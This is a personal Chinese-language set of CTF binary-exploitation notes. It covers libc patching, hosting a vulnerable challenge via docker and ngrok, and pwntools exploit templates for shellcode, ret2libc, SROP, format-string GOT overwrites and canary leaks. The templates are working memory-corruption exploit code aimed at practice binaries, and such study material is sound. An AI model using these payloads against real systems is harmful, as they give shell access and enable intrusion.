# [个人] 零基础的二进制漏洞笔记



# GDB加载指定Libc



## 1. 分解操作

### I. 工具准备

```shell
sudo wget https://github.com/io12/pwninit/releases/download/3.3.0/pwninit -O /usr/local/bin/pwninit
sudo chmod +x /usr/local/bin/pwninit
```

### II. 下载ld符号

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc-*
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc.*
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc*
sudo cp ld* /home/kali/Desktop/ctf/debug
```

### III. 指定Libc

```shell
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
```

### IV. 查看Libc

```shell
readelf -l pwn | grep -A1 INTERP
readelf -d pwn | grep RUNPATH
```

```shell
ldd pwn
```



## 2. 一键操作

### I. 老手一键连招(无符号文件)

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc-*
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc.*
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc*
sudo cp ld* /home/kali/Desktop/ctf/debug
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
ldd pwn
```

### II. 老手一键连招(有符号文件)

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
sudo cp ld* /home/kali/Desktop/ctf/debug
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
ldd pwn
```



# 出题目

## 1. 编写题目

编写文件`pwn.c`

```c
#include <stdlib.h>

int main() {
    return 0;
}
```

## 2. 编译题目

编译文件`pwn.c` -> `pwn.exe` | `pwn`

```shell
gcc -g -std=c90 -fno-stack-protector -no-pie pwn.c -o pwn
```

## 3. 下载docker

```shell
sudo apt-get update
sudo apt-get install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io
```

## 4. 配置docker

```shell
cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

## 5. 启动docker

### I. 下载容器

```shell
sudo docker run -it --name ubuntu-linux-pwn-ctf ubuntu:latest /bin/bash
```

### II. 启动容器

```shell
sudo docker ps -a
```

```shell
CONTAINER ID   IMAGE           COMMAND       CREATED        STATUS          PORTS     NAMES
1e771be0d529   ubuntu:latest   "/bin/bash"   26 hours ago   Up 35 minutes             ubuntu-linux-pwn-ctf
```

```shell
sudo docker start ubuntu-linux-pwn-ctf
sudo docker exec -it ubuntu-linux-pwn-ctf /bin/bash
```

## 6. docker容器内下载wget

```shell
apt update
apt install -y wget unzip
```

## 7. docker容器内下载ngrok

```shell
mkdir -p /ngrok && cd /ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -zxvf ngrok-v3-stable-linux-amd64.tgz
```

## 8. 拷贝题目到docker容器内

```shell
mkdir /pwn
sudo docker cp pwn ubuntu-linux-pwn-ctf:/pwn
chmod +x /pwn/pwn
```

## 9. docker容器内添加flag

```shell
at > /pwn/flag << EOF
flag{probie}
EOF
```

## 10. docker容器内开放端口

```shell
cd /pwn
nohup socat TCP-LISTEN:9999,fork,reuseaddr EXEC:/pwn/pwn > pwn/pwn.log 2>&1 &
cd /ngrok
./ngrok tcp 9999
```

## 11. docker容器内下载netcat

```shell
apt install -y socat netcat-traditional net-tools
```

## 12. docker容器内测试连接

```shell
nc localhost 9999
```

```shell
nc 0.tcp.jp.ngrok.io 11402
```



# PWN库中的ShellCode模板使用

## 1. 跳转到真实物理地址

```python
from pwn import *

context(os="linux", arch="amd64")

r = remote("localhost", 8080)

payload = asm(shellcraft.sh())
payload += p64(backdoor_elf_addr)

r.sendlineafter("> \n".encode(), payload)

r.interactive()
```

## 2. 获取指定文件的内容

```python
from pwn import *

context(os="linux", arch="amd64")

r = remote("localhost", 8080)

shellcode = shellcraft.openat(0, "/flag", 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)

r.sendlineafter("> \n".encode(), payload)

r.interactive()
```



# 数字打包

## 1.万能公式

```shell
int16
```

```shell
p16(-559038737)
```

```shell
int
```

```shell
p32(-559038737)
```

```
int64
```

```shell
p64(-559038737)
```

## 2. 万能局限

```shell
pack(-559038737, 32, endian='little', signed=True)
```

## 3. 方便公式

```shell
bytes([i]) # i ∈ (0,256)
```



# 更换输出

## 1. 知识

```shell
0 → stdin  标准输入
1 → stdout 标准输出
2 → stderr 标准错误

close(1); # 关闭标准输出
```

## 2. 公式

```shell
exec 1>&0 # 将标准输出重定向到标准输入
```



# 数据搜集

## 1. 手动

```shell
strings -a -t x libc.so.6 | grep "/bin/sh"

ropper -f pwn --search "pop rsi; ret;"

readelf -s pwn | grep puts

objdump -R pwn | grep puts # got

objdump -d pwn | grep puts # plt

objdump -T libc.so.6 | grep puts # got

nm -D libc.so.6 | grep stdout
```

## 2. 自动

```python
# r = remote("127.0.0.1", 12892)
r = process(["./pwn"])

elf = ELF("./pwn")
libc = ELF("libc.so.6")
rop = ROP([elf])

# gdb.attach(r, """b *0x40134A""")

rop.find_gadget(["pop rdi", "ret"])[0]

next(libc.search('/bin/sh\x00'.encode()))

libc.sym["system"]
```



# ret2libc

## 1. 有libc文件

```shell
直接 ret2libc 口牙
```

## 2. 无libc文件

### I. LibcSearcher

```python
payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(puts_plt_elf_addr)
payload += p64(ret_elf_addr) + p64(vuln_elf_addr)
r.sendafter("payload: ".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

time.sleep(1)

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(read_got_elf_addr) + p64(puts_plt_elf_addr)
payload += p64(ret_elf_addr) + p64(vuln_elf_addr)
r.sendafter("payload:".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)

# libc.select_libc(0)

puts_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_libc_offset

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(ret_elf_addr) + p64(system_libc_addr)
r.sendafter("payload:".encode(), payload)
```

### II. DynELF

```python
def leak_got_libc_addr(addr):
    payload = cyclic(0x6C)
    payload += p32(0xdeadbeef)
    payload += p32(elf.plt["write"])
    payload += p32(main_elf_addr)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    r.sendafter(b"~!\n", payload)
    return r.recv(4)

dnyELF = DynELF(leak_got_libc_addr, elf=elf) # type: ignore
system_libc_addr = dnyELF.lookup("system", "libc")

payload = cyclic(0x6C)
payload += p32(0xdeadbeef)
payload += p32(elf.plt["read"]) + p32(main_elf_addr) + p32(0) + p32(elf.bss() + 0x200) + p32(8)
r.sendafter(b"~!\n", payload)

r.send(b"/bin/sh\x00")

payload = cyclic(0x6C)
payload += p32(0xdeadbeef)
payload += p32(system_libc_addr) + p32(rop.find_gadget(["ret"])[0]) + p32(elf.bss() + 0x200)
r.sendafter(b"~!\n", payload)
```



# SROP

```python
bin_sh_elf_addr = 0x403033
syscall_ret_elf_addr = 0x401077

frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = bin_sh_elf_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_elf_addr

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(syscall_ret_elf_addr)
payload += p64(syscall_ret_elf_addr)
payload += bytes(frame)
r.send(payload)

sleep(2)

r.send(cyclic(15))
```



# fmt

## 1. 栈上

```python
payload = "/bin/sh;%43$p".encode()
r.sendlineafter("name?\n".encode(), payload)

r.recvuntil("0x".encode())

libc_start_main_libc_addr = int("0x" + r.recvline().decode().strip(), 16) - 128
libc_start_main_libc_offset = 0x29dc0

libc_base_addr = libc_start_main_libc_addr - libc_start_main_libc_offset

print("libc_start_main_libc_addr", hex(libc_start_main_libc_addr))
print("libc_base_addr", hex(libc_base_addr))

fmt_offset = 9

puts_got_elf_addr = 0x404018

system_libc_offset = 0x50d70
system_libc_addr = libc_base_addr + system_libc_offset

payload = fmtstr_payload(fmt_offset, {puts_got_elf_addr : system_libc_addr}, write_size = "short")
```

- pwntools的fmtstr_payload的write_size

  | write_size | 对应格式化字符串 | 写入字节数      | 作用                        |
  | ---------- | ---------------- | --------------- | --------------------------- |
  | `byte`     | `%hhn`           | 1 字节（8bit）  | 只写目标地址的低 1 字节     |
  | `short`    | `%hn`            | 2 字节（16bit） | 写目标地址低 2 字节         |
  | `int`      | `%n`             | 4 字节（32bit） | 写 4 字节                   |
  | `long`     | `%lln`           | 8 字节（64bit） | 写完整 8 字节地址，仅 64 位 |



## 2. 非栈上



# ctypes

## 1. rand

```python
from ctypes import *

libc = CDLL("libc.so.6")
libc.srand(int(time.time()))
rand = libc.rand()
```



# canary

## 1. leak

```python
payload = cyclic(40 - 1) + b"|"
r.sendafter(b"name?", payload)

r.recvuntil(b"|")
canary = u64(r.recv(6).ljust(8, b'\x00'))
print("canary", hex(canary))
```



# leave; ret;

## leave

```assembly
mov rsp, rbp
pop rbp
(rsp += 8)
```

## ret

```assembly
pop rip
(rsp += 8)
```

